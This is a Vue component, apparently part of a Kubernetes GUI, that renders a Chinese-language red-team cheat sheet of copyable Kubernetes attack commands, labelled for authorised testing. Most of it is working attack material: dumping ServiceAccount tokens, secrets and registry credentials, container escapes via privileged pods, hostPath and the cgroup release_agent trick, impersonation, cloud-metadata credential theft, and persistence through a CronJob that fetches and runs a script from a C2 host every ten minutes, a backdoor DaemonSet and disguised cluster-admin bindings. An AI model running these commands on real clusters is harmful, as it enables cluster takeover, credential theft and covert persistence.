<script setup lang="ts">
import { ref, computed } from 'vue'
import { ElMessage } from 'element-plus/es/components/message/index'

type Cmd = {
  label: string
  code: string
  note?: string
}
type Section = {
  id: string
  title: string
  sub: string
  cmds: Cmd[]
}

// =============================================================================
// 红队 K8s 全流程速查 —— 仅用于授权测试
// 命令分组按 kill-chain：信息收集 → 权限自查 → 资源枚举 → 凭据 → 逃逸 → 横向 → 持久化 → 工具
// =============================================================================
const sections: Section[] = [
  {
    id: 'recon-pod',
    title: '1 · Pod 内信息收集',
    sub: '在已落地的容器里收集身份、内核、网络、挂载、capabilities 等基本信息。',
    cmds: [
      { label: 'WHOAMI',  code: 'id; hostname; uname -a; cat /etc/os-release 2>/dev/null', note: '基本身份与内核' },
      { label: 'PROC',    code: 'ps -ef 2>/dev/null || ps aux 2>/dev/null', note: '在跑哪些进程' },
      { label: 'NET',     code: 'ip a 2>/dev/null || ifconfig; ip r 2>/dev/null || route -n; cat /etc/resolv.conf', note: '网络/DNS（pod IP、CoreDNS、kube-dns）' },
      { label: 'ENV',     code: 'env | grep -Ei "KUBE|TOKEN|HOST|PORT|SECRET|PASS"', note: '常被注入的敏感环境变量' },
      { label: 'MOUNTS',  code: 'mount; cat /proc/mounts | grep -Ev "proc|cgroup|tmpfs"', note: '看是否挂了 hostPath / docker.sock / overlay' },
      { label: 'CAPS',    code: 'cat /proc/self/status | grep -i cap; capsh --print 2>/dev/null', note: 'Linux capabilities（CAP_SYS_ADMIN 直接逃）' },
      { label: 'ROOT-FS', code: 'ls -la / ; ls -la /host 2>/dev/null', note: '根目录有奇怪挂载？hostPath 一般在 /host /rootfs' },
      { label: 'CGROUP',  code: 'cat /proc/1/cgroup', note: '判断 runtime（docker/containerd）与是否在容器里' },
    ],
  },
  {
    id: 'sa-creds',
    title: '2 · 拿 ServiceAccount 凭据',
    sub: '读取 Pod 内自动挂载的 ServiceAccount token、CA 证书和 namespace。',
    cmds: [
      { label: 'TOKEN', code: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token', note: 'Bearer Token，填到 KubeGUI 的 token 字段' },
      { label: 'CA',    code: 'cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt', note: 'apiserver CA' },
      { label: 'NS',    code: 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace', note: '当前 ns' },
      { label: 'API',   code: 'echo "https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"', note: 'apiserver URL（环境变量自动注入）' },
      {
        label: 'ALL',
        code:
          'echo "API=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}";' +
          ' echo "NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)";' +
          ' echo "--- TOKEN ---"; cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo;' +
          ' echo "--- CA ---"; cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
        note: '一行打包：webshell 里贴这个就够',
      },
      {
        label: 'NO-SA',
        code:
          'ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null ||' +
          ' find / -name "token" -path "*serviceaccount*" 2>/dev/null',
        note: 'automountServiceAccountToken: false 时找其它路径',
      },
    ],
  },
  {
    id: 'apiserver-direct',
    title: '3 · 不装 kubectl 直接打 apiserver',
    sub: '用 curl + Bearer Token 直接请求 apiserver REST API，无需 kubectl。',
    cmds: [
      {
        label: 'INIT',
        code:
          'APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}";' +
          ' TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);' +
          ' CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt;' +
          ' NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace);' +
          ' alias k=\'curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN"\'',
        note: '在 shell 里跑一次，下面命令直接 k <path>',
      },
      { label: 'VERSION', code: 'k $APISERVER/version', note: '验证 token 可用 + 版本' },
      { label: 'SELF',    code: 'k -XPOST $APISERVER/apis/authentication.k8s.io/v1/selfsubjectreviews -H "Content-Type: application/json" -d \'{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}\'', note: '我是谁（k8s ≥1.28）' },
      { label: 'NS-LIST', code: 'k $APISERVER/api/v1/namespaces', note: '列所有 namespace（需要 cluster-level 权限）' },
      { label: 'PODS-NS', code: 'k $APISERVER/api/v1/namespaces/$NS/pods', note: '列当前 ns 的 pod' },
      { label: 'PODS-ALL',code: 'k $APISERVER/api/v1/pods', note: '列全集群 pod（需要 list pods 集群权限）' },
      { label: 'SECRETS', code: 'k $APISERVER/api/v1/secrets', note: '所有 secret —— 横向核心' },
      { label: 'NODES',   code: 'k $APISERVER/api/v1/nodes', note: '节点列表 + 内网 IP' },
    ],
  },
  {
    id: 'rbac-check',
    title: '4 · 权限自查（你能干什么）',
    sub: '通过 auth can-i 检查当前身份在各 namespace 的 RBAC 权限。',
    cmds: [
      { label: 'CAN-I-ALL', code: 'kubectl auth can-i --list', note: '列出当前身份在当前 ns 的全部权限' },
      { label: 'CAN-I-NS',  code: 'kubectl auth can-i --list -n kube-system', note: '看 kube-system 的权限（管理员级目标）' },
      { label: 'CAN-CREATE',code: 'for v in pods deployments daemonsets cronjobs nodes secrets serviceaccounts clusterrolebindings rolebindings mutatingwebhookconfigurations; do echo -n "$v: "; kubectl auth can-i create $v -A 2>/dev/null; done', note: '一把过常见敏感动作' },
      { label: 'CAN-EXEC',  code: 'kubectl auth can-i create pods/exec -A; kubectl auth can-i get nodes/proxy -A; kubectl auth can-i create pods --subresource=ephemeralcontainers -A', note: '直接 exec / nodes proxy / ephemeral 容器都通了？基本=root' },
      { label: 'WHOAMI',    code: 'kubectl auth whoami 2>/dev/null || kubectl get --raw "/apis/authentication.k8s.io/v1/selfsubjectreviews" -XPOST -f - <<<\'{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}\'', note: '当前身份' },
      { label: 'RBAC-DUMP', code: 'kubectl get clusterrolebindings,rolebindings -A -o wide 2>/dev/null', note: '全集群绑定，找绑到 system:anonymous / system:unauthenticated / default 的' },
    ],
  },
  {
    id: 'enum',
    title: '5 · 集群枚举',
    sub: '枚举节点、Pod、Secret、ServiceAccount、Ingress、镜像和 CRD。',
    cmds: [
      { label: 'NODES',     code: 'kubectl get nodes -o wide', note: '节点 + 内网 IP + 版本' },
      { label: 'PODS',      code: 'kubectl get pods -A -o wide', note: '所有 pod，注意带 hostNetwork / hostPID 的' },
      { label: 'PRIV-PODS', code: 'kubectl get pods -A -o json | jq -r \'.items[] | select(.spec.containers[].securityContext.privileged==true) | "\\(.metadata.namespace)/\\(.metadata.name)"\'', note: '所有 privileged pod —— 落地首选' },
      { label: 'HOSTPATH',  code: 'kubectl get pods -A -o json | jq -r \'.items[] | select(.spec.volumes[]?.hostPath) | "\\(.metadata.namespace)/\\(.metadata.name)"\'', note: '所有挂了 hostPath 的 pod' },
      { label: 'SECRETS',   code: 'kubectl get secrets -A', note: 'secret 列表' },
      { label: 'SA',        code: 'kubectl get sa -A', note: 'ServiceAccount 列表' },
      { label: 'INGRESS',   code: 'kubectl get ingress,svc -A -o wide', note: '看暴露面' },
      { label: 'IMAGES',    code: 'kubectl get pods -A -o jsonpath="{range .items[*]}{.spec.containers[*].image}{\'\\n\'}{end}" | sort -u', note: '所有镜像（找内部 registry / 老镜像）' },
      { label: 'CRD',       code: 'kubectl get crd', note: 'CRD 列表（识别 Istio / Argo / KubeFlow 等）' },
    ],
  },
  {
    id: 'secrets',
    title: '6 · 凭据收集',
    sub: '批量导出 Secret 并 base64 解码，提取 dockerconfig、SA token、ConfigMap 明文凭据。',
    cmds: [
      { label: 'DUMP-ALL', code: 'kubectl get secrets -A -o json | jq -r \'.items[] | "=== \\(.metadata.namespace)/\\(.metadata.name) (\\(.type)) ===\\n\\(.data | to_entries[] | "\\(.key): \\(.value | @base64d)")"\'', note: '全 ns secret base64 解开' },
      { label: 'DOCKER',   code: 'kubectl get secrets -A -o json | jq -r \'.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .data[".dockerconfigjson"]\' | base64 -d', note: '镜像仓库账号密码（拉私有镜像→塞后门）' },
      { label: 'SA-TOKEN', code: 'kubectl get secrets -A -o json | jq -r \'.items[] | select(.type=="kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name): \\(.data.token | @base64d)"\'', note: '所有 SA token（用 admin sa 的换权限）' },
      { label: 'GEN-TOKEN',code: 'kubectl create token <sa-name> -n <ns> --duration=24h', note: 'k8s ≥1.24：动态签 token，不留 secret' },
      { label: 'CM-LEAK',  code: 'kubectl get cm -A -o json | jq -r \'.items[] | "=== \\(.metadata.namespace)/\\(.metadata.name) ===\\n\\(.data)"\' | grep -iE "pass|secret|token|key|aws|gcp" -A1 -B1', note: 'ConfigMap 里常被塞明文密码' },
      { label: 'KUBELET',  code: 'curl -sk https://<node-ip>:10250/pods/ -H "Authorization: Bearer $TOKEN"', note: 'kubelet 只读端口（node 上有时不鉴权）' },
    ],
  },
  {
    id: 'escape',
    title: '7 · 容器逃逸 / 节点接管',
    sub: '利用 privileged、hostPath、docker.sock、capabilities 等从 Pod 获取节点 root。',
    cmds: [
      { label: 'PRIV-POD',  code: 'kubectl run pwn --image=alpine --restart=Never --privileged --overrides=\'{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"pwn","image":"alpine","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","sh"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}\' -it', note: '一行起 privileged + hostPID + nsenter 到 node root（要 create pods 权限）' },
      { label: 'HOSTPATH',  code: 'kubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata: {name: pwn-hostpath}\nspec:\n  hostNetwork: true\n  containers:\n  - name: c\n    image: alpine\n    command: ["sh","-c","chroot /host sh"]\n    stdin: true\n    tty: true\n    volumeMounts: [{name: h, mountPath: /host}]\n  volumes: [{name: h, hostPath: {path: /}}]\nEOF', note: '挂 / 到 /host 再 chroot，等价 node root' },
      { label: 'DOCKER-SOCK',code: 'ls -la /var/run/docker.sock 2>/dev/null && curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json', note: '挂了 docker.sock 时直接 docker API 控宿主' },
      { label: 'CRI-SOCK', code: 'ls -la /run/containerd/containerd.sock 2>/dev/null; ls -la /run/crio/crio.sock 2>/dev/null', note: 'containerd/cri-o socket，找到了 crictl 直接搞' },
      { label: 'CAP-ADMIN',code: 'mkdir /tmp/cg && mount -t cgroup -o memory cgroup /tmp/cg && echo 1 > /tmp/cg/notify_on_release && host=$(sed -n "s/.*\\perdir=\\([^,]*\\).*/\\1/p" /etc/mtab) && echo "$host/cmd" > /tmp/cg/release_agent && echo "#!/bin/sh\\nps > $host/output" > /cmd && chmod +x /cmd && sh -c "echo \\$\\$ > /tmp/cg/cgroup.procs"', note: 'CAP_SYS_ADMIN + cgroup notify_on_release 逃逸（经典）' },
      { label: 'PROC-MEM', code: 'ls -la /proc/1/root/ 2>/dev/null', note: 'hostPID + shareProcessNamespace 时可直接访问宿主 PID 1 的 fs' },
    ],
  },
  {
    id: 'lateral',
    title: '8 · 横向移动',
    sub: '通过 impersonate、pods/exec、ephemeral container、nodes/proxy、云元数据跨 namespace 移动。',
    cmds: [
      { label: 'IMPERSONATE',code: 'kubectl --as=system:masters get pods -A', note: '有 impersonate 权限直接扮 cluster-admin' },
      { label: 'EXEC-OTHER',code: 'kubectl exec -n <ns> <pod> -- sh', note: '有 pods/exec 权限就能进任何 pod' },
      { label: 'EPHEMERAL',code: 'kubectl debug -n <ns> <pod> --image=alpine --target=<container> -it', note: 'ephemeral container 注入到目标 pod 共享 PID/网络' },
      { label: 'NODE-PROXY',code: 'kubectl get --raw "/api/v1/nodes/<node>/proxy/run/<ns>/<pod>/<container>/<cmd>"', note: 'nodes/proxy 权限走 kubelet 后门' },
      { label: 'PORT-FWD', code: 'kubectl port-forward -n <ns> svc/<svc> 8080:80', note: '把内网服务拉到本地（KubeGUI 的 Port-Forward tab 也行）' },
      { label: 'SSRF',     code: 'curl -sk https://169.254.169.254/latest/meta-data/iam/security-credentials/', note: 'pod 网络通云元数据时偷云凭据（AWS/GCP/阿里都有）' },
    ],
  },
  {
    id: 'persist',
    title: '9 · 持久化',
    sub: '通过 CronJob、DaemonSet、ClusterRoleBinding、MutatingWebhook 建立持久访问。',
    cmds: [
      { label: 'CRONJOB',  code: 'kubectl apply -f - <<EOF\napiVersion: batch/v1\nkind: CronJob\nmetadata: {name: sys-update, namespace: kube-system}\nspec:\n  schedule: "*/10 * * * *"\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          hostNetwork: true\n          containers: [{name: c, image: alpine, command: ["sh","-c","wget -qO- http://<c2>/r.sh | sh"]}]\n          restartPolicy: OnFailure\nEOF', note: '每 10 分钟回连 c2' },
      { label: 'DAEMONSET',code: 'kubectl apply -f - <<EOF\napiVersion: apps/v1\nkind: DaemonSet\nmetadata: {name: node-agent, namespace: kube-system}\nspec:\n  selector: {matchLabels: {app: node-agent}}\n  template:\n    metadata: {labels: {app: node-agent}}\n    spec:\n      hostPID: true\n      hostNetwork: true\n      containers:\n      - name: c\n        image: alpine\n        securityContext: {privileged: true}\n        command: ["sh","-c","while true; do sleep 3600; done"]\n        volumeMounts: [{name: h, mountPath: /host}]\n      volumes: [{name: h, hostPath: {path: /}}]\nEOF', note: '每个 node 一个 privileged pod 挂 /，常驻 backdoor' },
      { label: 'CLUSTER-ADMIN-BIND', code: 'kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default', note: '把 default/default SA 直接绑 cluster-admin（粗暴有效）' },
      { label: 'SHADOW-SA',code: 'kubectl create sa backup -n kube-system; kubectl create clusterrolebinding backup-binding --clusterrole=cluster-admin --serviceaccount=kube-system:backup', note: '在 kube-system 起一个看似无害的 sa 绑 admin' },
      { label: 'MUTATING-WEBHOOK',code: '# MutatingWebhookConfiguration 拦截所有 pod 创建，注入 sidecar / 环境变量\nkubectl get mutatingwebhookconfigurations', note: '终极隐蔽：所有新 pod 都被你改一次（自行构造）' },
    ],
  },
  {
    id: 'tools',
    title: '10 · 工具下载（pod 里没装时）',
    sub: '在受限容器内下载 kubectl、jq、peirates、kubeletctl 等工具。',
    cmds: [
      { label: 'KUBECTL', code: 'curl -LO https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl', note: '官方 kubectl' },
      { label: 'JQ',      code: 'curl -LO https://github.com/jqlang/jq/releases/latest/download/jq-linux-amd64 && chmod +x jq-linux-amd64 && mv jq-linux-amd64 /tmp/jq', note: 'jq 单文件二进制' },
      { label: 'PEIRATES',code: 'curl -L https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64.tar.gz | tar xz', note: 'K8s 渗透瑞士军刀' },
      { label: 'KUBELETCTL',code: 'curl -LO https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64 && chmod +x kubeletctl_linux_amd64', note: '直接打 kubelet 10250' },
      { label: 'NSENTER', code: 'which nsenter || apk add util-linux 2>/dev/null || apt-get install -y util-linux', note: 'alpine 没自带 nsenter' },
    ],
  },
]

// ---------- copy state ----------
const copied = ref<string | null>(null)
async function copy(code: string) {
  try {
    await navigator.clipboard.writeText(code)
    copied.value = code
    setTimeout(() => { if (copied.value === code) copied.value = null }, 1400)
  } catch {
    ElMessage.error('复制失败，请手动选取')
  }
}

// ---------- collapse state ----------
const open = ref<Record<string, boolean>>(
  Object.fromEntries(sections.map(s => [s.id, true]))
)
function toggle(id: string) { open.value[id] = !open.value[id] }

// ---------- search filter ----------
const q = ref('')
const filteredSections = computed(() => {
  const kw = q.value.trim().toLowerCase()
  if (!kw) return sections
  return sections
    .map(s => ({
      ...s,
      cmds: s.cmds.filter(c =>
        c.label.toLowerCase().includes(kw) ||
        c.code.toLowerCase().includes(kw) ||
        (c.note || '').toLowerCase().includes(kw),
      ),
    }))
    .filter(s => s.cmds.length > 0 || s.title.toLowerCase().includes(kw))
})

const totalCount = computed(() => sections.reduce((n, s) => n + s.cmds.length, 0))
</script>

<template>
  <el-main class="cs-main">
    <div class="cs-wrap">
      <!-- header -->
      <header class="cs-header">
        <div>
          <div class="cs-eyebrow">PENTEST CHEATSHEET · 仅用于授权测试</div>
          <h1 class="cs-title">K8s 红队命令速查</h1>
          <p class="cs-sub">
            按 kill-chain 排好：信息收集 → 权限自查 → 凭据收集 → 容器逃逸 → 横向 → 持久化。
            每条命令右侧点 <b>复制</b> 即可。
          </p>
        </div>
        <div class="cs-search">
          <svg class="cs-search__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
               stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="11" cy="11" r="8"/>
            <line x1="21" y1="21" x2="16.65" y2="16.65"/>
          </svg>
          <input v-model="q" placeholder="搜索：label / 命令 / 备注..." />
          <span class="cs-search__count">{{ q ? filteredSections.reduce((n, s) => n + s.cmds.length, 0) : totalCount }} / {{ totalCount }}</span>
        </div>
      </header>

      <!-- sections -->
      <section
        v-for="s in filteredSections"
        :key="s.id"
        class="cs-section"
      >
        <div class="cs-section__head" @click="toggle(s.id)">
          <div>
            <div class="cs-section__title">{{ s.title }}</div>
            <div class="cs-section__sub">{{ s.sub }}</div>
          </div>
          <div class="cs-section__meta">
            <span class="cs-section__badge">{{ s.cmds.length }}</span>
            <svg
              class="cs-section__chev"
              :class="{ 'is-open': open[s.id] }"
              viewBox="0 0 24 24" fill="none" stroke="currentColor"
              stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
            >
              <polyline points="6 9 12 15 18 9"/>
            </svg>
          </div>
        </div>

        <transition name="cs-collapse">
          <div v-show="open[s.id]" class="cs-section__body">
            <div v-for="(c, i) in s.cmds" :key="i" class="cs-cmd">
              <div class="cs-cmd__top">
                <div class="cs-cmd__label">{{ c.label }}</div>
                <div v-if="c.note" class="cs-cmd__note">{{ c.note }}</div>
                <button
                  type="button"
                  class="cs-cmd__copy"
                  :class="{ 'is-copied': copied === c.code }"
                  @click="copy(c.code)"
                >
                  <svg v-if="copied !== c.code"
                       viewBox="0 0 24 24" fill="none" stroke="currentColor"
                       stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                  </svg>
                  <svg v-else
                       viewBox="0 0 24 24" fill="none" stroke="currentColor"
                       stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"/>
                  </svg>
                  <span>{{ copied === c.code ? '已复制' : '复制' }}</span>
                </button>
              </div>
              <pre class="cs-cmd__code">{{ c.code }}</pre>
            </div>
          </div>
        </transition>
      </section>

      <footer class="cs-foot">
        命令仅用于授权红队评估 / CTF / 自有环境。 ·
        <span style="color: var(--kg-text-dim)">参考：peirates / kube-hunter / Kubernetes Threat Matrix</span>
      </footer>
    </div>
  </el-main>
</template>

<style scoped>
.cs-main {
  background: var(--kg-bg);
  padding: 0;
}
.cs-wrap {
  max-width: 1080px;
  margin: 0 auto;
  padding: 32px 28px 60px;
}

/* ---------- header ---------- */
.cs-header {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 24px;
  margin-bottom: 28px;
  padding-bottom: 20px;
  border-bottom: 1px solid var(--kg-border-soft);
}
.cs-eyebrow {
  font-family: var(--kg-font-mono);
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 1.6px;
  color: var(--kg-warn);
  margin-bottom: 10px;
}
.cs-title {
  font-size: 28px;
  font-weight: 700;
  letter-spacing: -0.4px;
  margin: 0 0 8px;
  color: var(--kg-text);
}
.cs-sub {
  margin: 0;
  font-size: 13.5px;
  line-height: 1.65;
  color: var(--kg-text-muted);
  max-width: 640px;
}
.cs-sub b { color: var(--kg-accent); font-weight: 600; }

.cs-search {
  position: relative;
  display: flex;
  align-items: center;
  gap: 8px;
  width: 320px;
  padding: 0 12px;
  height: 38px;
  background: var(--kg-surface);
  border: 1px solid var(--kg-border);
  border-radius: 8px;
  transition: border-color .18s, box-shadow .18s;
}
.cs-search:focus-within {
  border-color: var(--kg-accent);
  box-shadow: 0 0 0 3px var(--kg-accent-ring);
}
.cs-search__icon { width: 14px; height: 14px; color: var(--kg-text-dim); flex-shrink: 0; }
.cs-search input {
  flex: 1;
  background: transparent;
  border: none;
  outline: none;
  color: var(--kg-text);
  font-family: var(--kg-font-sans);
  font-size: 13px;
  min-width: 0;
}
.cs-search input::placeholder { color: var(--kg-text-dim); }
.cs-search__count {
  font-family: var(--kg-font-mono);
  font-size: 11px;
  color: var(--kg-text-dim);
  flex-shrink: 0;
}

/* ---------- section ---------- */
.cs-section {
  background: var(--kg-surface);
  border: 1px solid var(--kg-border-soft);
  border-radius: 10px;
  margin-bottom: 12px;
  overflow: hidden;
}
.cs-section__head {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  padding: 16px 20px;
  cursor: pointer;
  transition: background .18s;
}
.cs-section__head:hover { background: var(--kg-surface-2); }
.cs-section__title {
  font-size: 14.5px;
  font-weight: 600;
  color: var(--kg-text);
  margin-bottom: 3px;
}
.cs-section__sub {
  font-size: 12px;
  color: var(--kg-text-muted);
  line-height: 1.5;
}
.cs-section__meta {
  display: flex;
  align-items: center;
  gap: 12px;
  flex-shrink: 0;
}
.cs-section__badge {
  font-family: var(--kg-font-mono);
  font-size: 11px;
  font-weight: 600;
  padding: 2px 8px;
  border-radius: 10px;
  background: var(--kg-surface-2);
  color: var(--kg-text-muted);
  border: 1px solid var(--kg-border-soft);
}
.cs-section__chev {
  width: 16px;
  height: 16px;
  color: var(--kg-text-dim);
  transition: transform .2s var(--kg-ease);
}
.cs-section__chev.is-open { transform: rotate(180deg); color: var(--kg-text); }

.cs-section__body {
  border-top: 1px solid var(--kg-border-soft);
  padding: 12px 14px 14px;
}

/* ---------- command card ---------- */
.cs-cmd {
  background: #07090D;
  border: 1px solid var(--kg-border-soft);
  border-radius: 7px;
  overflow: hidden;
  margin-top: 8px;
  transition: border-color .18s;
}
.cs-cmd:first-child { margin-top: 0; }
.cs-cmd:hover { border-color: var(--kg-border); }

.cs-cmd__top {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 9px 12px;
  background: var(--kg-surface-2);
  border-bottom: 1px solid var(--kg-border-soft);
}
.cs-cmd__label {
  font-family: var(--kg-font-mono);
  font-size: 10.5px;
  font-weight: 700;
  letter-spacing: 0.5px;
  padding: 2px 7px;
  border-radius: 3px;
  background: var(--kg-accent-soft);
  color: var(--kg-accent);
  flex-shrink: 0;
}
.cs-cmd__note {
  flex: 1;
  font-size: 12px;
  color: var(--kg-text-muted);
  line-height: 1.4;
}
.cs-cmd__copy {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 5px 10px;
  border: 1px solid var(--kg-border);
  background: transparent;
  color: var(--kg-text-muted);
  cursor: pointer;
  font-family: var(--kg-font-sans);
  font-size: 11.5px;
  font-weight: 500;
  letter-spacing: 0.3px;
  border-radius: 4px;
  transition: color .18s, border-color .18s, background .18s;
  flex-shrink: 0;
}
.cs-cmd__copy:hover {
  color: var(--kg-accent);
  border-color: var(--kg-accent);
  background: var(--kg-accent-soft);
}
.cs-cmd__copy.is-copied {
  color: var(--kg-accent);
  border-color: var(--kg-accent);
  background: var(--kg-accent-soft);
}
.cs-cmd__copy svg { width: 12px; height: 12px; }

.cs-cmd__code {
  margin: 0;
  padding: 11px 13px;
  font-family: var(--kg-font-mono);
  font-size: 12px;
  line-height: 1.7;
  color: #C9D1D9;
  white-space: pre-wrap;
  word-break: break-all;
  overflow-x: auto;
}

/* ---------- footer ---------- */
.cs-foot {
  margin-top: 32px;
  padding-top: 18px;
  border-top: 1px solid var(--kg-border-soft);
  text-align: center;
  font-size: 12px;
  color: var(--kg-text-muted);
}

/* ---------- transitions ---------- */
.cs-collapse-enter-active,
.cs-collapse-leave-active {
  transition: opacity .18s ease, transform .18s ease;
}
.cs-collapse-enter-from,
.cs-collapse-leave-to {
  opacity: 0;
  transform: translateY(-4px);
}

/* responsive */
@media (max-width: 768px) {
  .cs-header { flex-direction: column; align-items: stretch; }
  .cs-search { width: 100%; }
  .cs-cmd__top { flex-wrap: wrap; }
}
</style>
